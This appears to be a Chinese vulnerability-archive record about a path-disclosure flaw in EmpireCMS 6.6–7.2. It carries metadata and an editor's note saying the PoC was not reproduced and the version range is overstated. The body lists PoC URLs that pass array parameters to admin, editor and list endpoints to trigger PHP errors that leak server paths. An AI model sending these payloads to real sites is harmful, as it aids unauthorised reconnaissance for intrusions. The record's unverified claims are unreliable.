---
source: "hatch 补库批 20260928"
product: "EmpireCMS6.6/7.0/7.2"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "EmpireCMS 6.6-7.2 路径泄漏"
prerequisites: "来源所述条件，未列明部分仍待核：相关页面可达，PHP错误显示/路径输出；后台页面鉴权不明"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-0f1bd5540c120b6a9e62cb76"
entity_id: "ve-0f1bd5540c120b6a9e62cb76"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：相关页面可达，PHP错误显示/路径输出；后台页面鉴权不明

- **事实待核（1）**：标题6.6–7.2区间但正文仅三个离散版本不同端点，不能外推全区间。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（2）**：数组类型错误仅触发候选，无响应或路径泄漏样本；PHP版本/display_errors及登录条件缺失。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# EmpireCMS 6.6-7.2 路径泄漏

一、漏洞简介
------------

二、漏洞影响
------------

EmpireCMS 6.6-7.2

三、复现过程
------------

### POC :

> EmpireCMS 6.6 :

    http://www.0-sec.org/e/admin/tool/ShowPic.php?url[]=kongxin&pic_height[]=kongxin&pic_width[]=kongxin&picurl[]=kongxin& 

    http://www.0-sec.org/e/action/ListInfo.php?totalnum[]=kongxin&page[]=kongxin&myorder[]=kongxin&orderby[]=kongxin&andor[]=kongxin&ph[]=kongxin&tempid[]=kongxin&line[]=kongxin&endtime[]=kongxin&starttime[]=kongxin&ztid[]=kongxin&ttid[]=kongxin&classid[]=kongxin&mid[]=kongxin&

> EmpireCMS 7.0 :

    http://www.0-sec.org/e/admin/ecmseditor/infoeditor/epage/TranMore.php?InstanceName[]=kongxin&sinfo[]=kongxin&modtype[]=kongxin&infoid[]=kongxin&filepass[]=kongxin&classid[]=kongxin&showmod[]=kongxin&

> EmpireCMS 7.2 :

    http://www.0-sec.org/e/data/ecmseditor/infoeditor/epage/TranFile.php?filesize[]=kongxin&fname[]=kongxin&InstanceName[]=kongxin&filepass[]=kongxin&classid[]=kongxin&type[]=kongxin&showmod[]=kongxin&
